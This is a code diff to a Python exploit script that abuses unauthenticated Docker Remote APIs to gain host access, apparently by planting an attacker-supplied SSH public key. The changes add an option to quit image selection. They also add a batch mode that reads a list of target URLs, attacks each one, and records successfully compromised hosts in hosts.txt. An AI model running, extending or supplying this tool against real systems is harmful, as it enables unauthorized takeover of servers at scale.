@@ -16,7 +16,9 @@ def images_list(url):
             print(f"{Fore.LIGHTBLUE_EX}{index}. {tags}{Style.RESET_ALL}")
         while True:
             try:
-                image_index = int(input('Please choose a valid image to obtain host permissions (Input num): '))
+                image_index = int(input('Please choose a image or input 0 to quit(Input num): '))
+                if image_index == 0:
+                    break
                 if image_index in d1:
                     image = d1[image_index][0]
                     return image
@@ -28,6 +30,7 @@ def images_list(url):
         print(f"Error connecting to Docker API: {e}")
     finally:
         client.close()
+        return None
 
 
 def exp(pub_key, url, image):
@@ -62,17 +65,35 @@ if __name__ == '__main__':
                                                              https://github.com/Catherines77/docker_api_unauth
     \n""")
 
-    if len(sys.argv) != 5 or sys.argv[1] != '-u' or sys.argv[3] != '-k':
-        print('Usage: python docker_api_unauth_exp.py <-u> <url> <-k> <ssh_keygen>' + '\n')
+    if len(sys.argv) != 5:
+        print('Usage: python host_exp.py -u url -k ssh_keygen' + '\n')
         print('Param: -u: a target url')
         print('       -k: a ssh pub_key by openssl generated\n')
-        print("""Example: python docker_api_unauth_exp.py -u http://127.0.0.1:2375 -k "ssh-rsa AAAxxx" 
+        print("""Example: python host_exp.py -u http://127.0.0.1:2375 -k "ssh-rsa AAAxxx" 
                 """)
         sys.exit(1)
 
-    url = sys.argv[2]
-    pub_key = sys.argv[4]
+    if sys.argv[1] == '-u':
+        url = sys.argv[2]
+        pub_key = sys.argv[4]
 
-    image = images_list(url)
-    if image and exp(pub_key, url, image):
-        print(f'{Fore.GREEN}Exploitation successful, please use ssh username@target-ip to test.{Style.RESET_ALL}')
+        try:
+            image = images_list(url)
+            if image and exp(pub_key, url, image):
+                print(f'{Fore.GREEN}Exploitation successful, please use ssh username@target-ip to test.{Style.RESET_ALL}')
+        except Exception as e:
+            print(f'Connection error : {e}')
+
+    if sys.argv[1] == '-f':
+        with open(sys.argv[2], 'r') as f:
+            pub_key = sys.argv[4]
+            for line in f:
+                url = line.strip()
+                try:
+                    image = images_list(url)
+                    if image and exp(pub_key, url, image):
+                        print(f'{Fore.GREEN}Exploitation successful, please use ssh username@target-ip to test.{Style.RESET_ALL}')
+                        with open('hosts.txt','a') as x:
+                            x.write(url.split(':')[0]+'\n')
+                except Exception as e:
+                    print(f'Connection error : {e}')
